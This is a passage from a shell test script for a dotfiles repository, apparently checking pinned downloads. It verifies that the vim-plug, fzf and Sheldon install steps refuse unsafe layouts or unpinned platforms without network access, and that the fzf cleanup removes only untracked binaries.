  if [ -e "$leaked" ] || [ -L "$leaked" ]; then
    fail "failed vim-plug install leaked a temporary directory"
  fi
done

missing_config_home=$test_root/vim-no-config
mkdir -p "$missing_config_home/.vim/autoload"
: > "$curl_log"
: > "$vim_log"
if env -i HOME="$missing_config_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  DOTFILES_TEST_VIM_LOG="$vim_log" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" vim-plugins \
    > "$test_root/vim-no-config.out" 2>&1; then
  fail "vim-plugins succeeded without linked config"
fi
grep -F "make link" "$test_root/vim-no-config.out" >/dev/null || \
  fail "missing Vim config did not name the link phase"
[ ! -s "$curl_log" ] || fail "missing Vim config accessed the network"
[ ! -s "$vim_log" ] || fail "missing Vim config started Vim"

repo_copy=$test_root/repo-copy
mkdir -p "$repo_copy"
(cd "$repo" && tar -cf - Makefile mk setup vim) | (cd "$repo_copy" && tar -xf -)
rm -rf "$repo_copy/vim/.vim/autoload"
mkdir -p "$repo_copy/vim/.vim/autoload"
for folded_kind in autoload vim vim-missing-autoload; do
  folded_home=$test_root/folded-$folded_kind
  mkdir -p "$folded_home/.vim"
  case $folded_kind in
    autoload)
      mkdir -p "$repo_copy/vim/.vim/autoload"
      : > "$folded_home/.vim/config"
      rm -f "$folded_home/.vim/config"
      ln -s "$repo_copy/vim/.vim/config" "$folded_home/.vim/config"
      ln -s "$repo_copy/vim/.vim/autoload" "$folded_home/.vim/autoload"
      ;;
    vim | vim-missing-autoload)
      mkdir -p "$repo_copy/vim/.vim/autoload"
      if [ "$folded_kind" = vim-missing-autoload ]; then
        rm -rf "$repo_copy/vim/.vim/autoload"
      fi
      rm -rf "$folded_home/.vim"
      ln -s "$repo_copy/vim/.vim" "$folded_home/.vim"
      ;;
  esac
  : > "$curl_log"
  : > "$vim_log"
  if env -i HOME="$folded_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
    DOTFILES_TEST_VIM_LOG="$vim_log" \
    make -s -C "$repo_copy" DOWNLOAD_PINS_FILE="$fixture_pins" vim-plugins \
      > "$test_root/folded-$folded_kind.out" 2>&1; then
    fail "folded $folded_kind layout was accepted"
  fi
  grep -F "make link" "$test_root/folded-$folded_kind.out" >/dev/null || \
    fail "folded $folded_kind refusal did not explain migration"
  [ ! -s "$curl_log" ] || fail "folded $folded_kind layout accessed the network"
  [ ! -s "$vim_log" ] || fail "folded $folded_kind layout started Vim"
  [ ! -e "$repo_copy/vim/.vim/autoload/plug.vim" ] || \
    fail "folded $folded_kind layout wrote plug.vim into the repository"
done

printf 'fixture plug.vim\n' > "$vim_home/.vim/autoload/plug.vim"
fzf_dir=$vim_home/.local/share/vim/plugged/fzf
mkdir -p "$fzf_dir/bin"
git -C "$fzf_dir" init -q
git -C "$fzf_dir" config user.name Fixture
git -C "$fzf_dir" config user.email fixture@example.invalid
printf 'bin/fzf\n' > "$fzf_dir/.gitignore"
printf tracked > "$fzf_dir/bin/fzf-tmux"
git -C "$fzf_dir" add .gitignore bin/fzf-tmux
git -C "$fzf_dir" commit -qm fixture
printf unverified > "$fzf_dir/bin/fzf"
: > "$vim_log"
if env -i HOME="$vim_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" DOTFILES_TEST_VIM_LOG="$vim_log" \
  DOTFILES_REAL_GIT="$real_git" DOTFILES_TEST_GIT_MODE=fail-ls-files \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" vim-plugins \
    > "$test_root/vim-fzf-inspect.out" 2>&1; then
  fail "vim-plugins ignored an fzf index inspection failure"
fi
[ -f "$fzf_dir/bin/fzf" ] || fail "fzf inspection failure removed the binary"
[ ! -s "$vim_log" ] || fail "fzf inspection failure started Vim"
grep -F 'could not inspect plugin-local fzf binary' "$test_root/vim-fzf-inspect.out" >/dev/null || \
  fail "fzf inspection failure was not actionable"

: > "$curl_log"
run_vim_plugins > "$test_root/vim-fzf-cleanup.out"
[ ! -e "$fzf_dir/bin/fzf" ] || fail "untracked plugin-local fzf binary was preserved"
[ -f "$fzf_dir/bin/fzf-tmux" ] || fail "tracked fzf helper was removed"
grep -F 'removing plugin-local fzf override' "$test_root/vim-fzf-cleanup.out" >/dev/null || \
  fail "fzf binary cleanup was not reported"

printf tracked > "$fzf_dir/bin/fzf"
git -C "$fzf_dir" add -f bin/fzf
git -C "$fzf_dir" commit -qm 'track fzf fixture'
run_vim_plugins >/dev/null
[ -f "$fzf_dir/bin/fzf" ] || fail "tracked fzf binary was removed"

intel_sheldon=$test_root/intel-bin/sheldon
mkdir -p "$(dirname "$intel_sheldon")"
printf 'keep intel binary\n' > "$intel_sheldon"
intel_before=$(sh "$pin_script" sha256 "$intel_sheldon")
: > "$curl_log"
if env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=darwin-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" SHELDON_BIN="$intel_sheldon" sheldon \
    > "$test_root/intel.out" 2> "$test_root/intel.err"; then
  fail "Sheldon install unexpectedly succeeded on Intel macOS"
fi
grep -F 'no reviewed sheldon pin for darwin-amd64' "$test_root/intel.err" >/dev/null || \
  fail "Intel macOS refusal was not actionable"
[ ! -s "$curl_log" ] || fail "Intel macOS refusal accessed the network"
[ "$(sh "$pin_script" sha256 "$intel_sheldon")" = "$intel_before" ] || \
  fail "Intel macOS refusal changed the existing destination"
for leaked in "$test_root/intel-bin"/.pinned.*; do
  if [ -e "$leaked" ] || [ -L "$leaked" ]; then
    fail "Intel macOS refusal leaked a temporary directory"
  fi
done

echo "check-pins: plugin phase does not install tools"
sheldon_home=$test_root/sheldon-home
mkdir -p "$sheldon_home/.config/sheldon" "$sheldon_home/bin"
: > "$sheldon_home/.config/sheldon/plugins.toml"
plugin_sheldon=$sheldon_home/bin/sheldon
printf '%s\n' \
  '#!/bin/sh' \
  'case $1 in' \
  '  lock) exit 0 ;;' \
  '  source) printf "cached source\\n" ;;' \
  '  *) exit 1 ;;' \
  'esac' > "$plugin_sheldon"
chmod +x "$plugin_sheldon"
: > "$curl_log"
env -i HOME="$sheldon_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" SHELDON_BIN="$plugin_sheldon" sheldon-plugins >/dev/null
grep -F 'cached source' "$sheldon_home/.cache/dotfiles/sheldon.zsh" >/dev/null || \
  fail "sheldon-plugins did not write the cache"
[ ! -s "$curl_log" ] || fail "sheldon-plugins installed a tool binary"

: > "$curl_log"
if env -i HOME="$sheldon_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" SHELDON_BIN="$sheldon_home/bin/missing" sheldon-plugins \
    > "$test_root/missing-sheldon.out" 2>&1; then
  fail "sheldon-plugins succeeded without the Sheldon binary"
fi
grep -F 'make tools' "$test_root/missing-sheldon.out" >/dev/null || \
  fail "missing Sheldon binary did not name the tools phase"
[ ! -s "$curl_log" ] || fail "missing Sheldon plugin phase accessed the network"

echo "check-pins: ok"
